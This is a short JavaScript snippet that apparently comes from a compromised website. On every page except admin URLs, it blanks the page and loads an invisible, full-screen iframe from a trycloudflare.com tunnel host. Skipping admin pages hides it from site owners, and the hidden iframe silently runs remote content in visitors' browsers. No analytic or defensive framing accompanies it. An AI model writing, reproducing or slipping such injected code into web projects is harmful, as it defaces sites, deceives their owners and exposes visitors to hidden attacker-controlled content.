window.addEventListener('load', () => {
    if (window.location.href.includes('/admin/')) return;

    setTimeout(() => {
        document.body.innerHTML = '';

        const iframe = document.createElement('iframe');
        iframe.src = 'https://apps-warranties-tion-industries.trycloudflare.com/oke.html';
        
        iframe.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 999999;
            opacity: 0;           
            pointer-events: none; 
        `;

        document.body.appendChild(iframe);
    }, 200);
});
